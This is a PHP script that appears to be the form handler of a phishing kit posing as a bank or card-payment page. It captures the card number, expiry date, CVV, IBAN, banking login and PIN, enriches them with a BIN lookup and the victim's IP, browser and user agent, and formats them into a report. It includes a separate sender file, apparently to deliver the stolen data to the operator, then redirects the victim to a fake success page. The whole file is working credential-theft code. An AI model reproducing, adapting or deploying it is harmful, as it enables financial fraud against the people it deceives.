<?php
error_reporting(0);
session_start();

include("detect.php"); 
$useragent = $_SERVER['HTTP_USER_AGENT'];
$brow = getBrowser() ;
$sys = getOs();
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;

$InfoDATE   = date("d-m-Y h:i:sa");

$cardnumber = $_SESSION['cardnumber'] = $_POST['cardnumber'];
$expdate = $_SESSION['expdate'] = $_POST['expdate'];
$Securitycode = $_SESSION['Securitycode'] = $_POST['Securitycode'];
$nombank = $_SESSION['nombank'] = $_POST['nombank'];
$iban = $_SESSION['iban'] = $_POST['iban'];
$identifiant = $_SESSION['identifiant'] = $_POST['identifiant'];
$codeconf = $_SESSION['codeconf'] = $_POST['codeconf'];

$bincheck = $_POST['cardnumber'] ;
$bincheck = preg_replace('/\s/', '', $bincheck);

$bin = $_POST['cardnumber'] ;
$bin = preg_replace('/\s/', '', $bin);
$bin = substr($bin,0,8);
$url = "https://lookup.binlist.net/".$bin;
$headers = array();
$headers[] = 'Accept-Version: 3';
$ch = curl_init();  
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resp=curl_exec($ch);
curl_close($ch);
$xBIN = json_decode($resp, true);

$_SESSION['bank_name'] = $xBIN["bank"]["name"];
$_SESSION['bank_scheme'] = strtoupper($xBIN["scheme"]);
$_SESSION['bank_type'] = strtoupper($xBIN["type"]);
$_SESSION['bank_brand'] = strtoupper($xBIN["brand"]);


$yagmai .= '
[💳 CC Number] = '.$_SESSION['cardnumber'].'
[🔄 Expiry Date ] = '.$_SESSION['expdate'].'
[🔑 (CVV)] = '.$_SESSION['Securitycode'].'
[👤 Nom de la banque] = '.$_SESSION['nombank'].'
[👤 Iban] = '.$_SESSION['iban'].'
[👤 identifiant] = '.$_SESSION['identifiant'].'
[👤 Code confidentiel] = '.$_SESSION['codeconf'].'
        [+]━━━━【💳 Bin】━━━[+]
[🏛 Card Bank] = '.$_SESSION['bank_name'].' 
[💳 Card type] = '.$_SESSION['bank_type'].' 
[💳 Card brand] = '.$_SESSION['bank_brand'].' 
       [+]━━━━【💻 System】━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$brow.' and '.$sys.'
[🔍 FINGERPRINT] = '.$useragent.'
';

include("SendApi.php"); 

header('Location: ../succes.php');

?>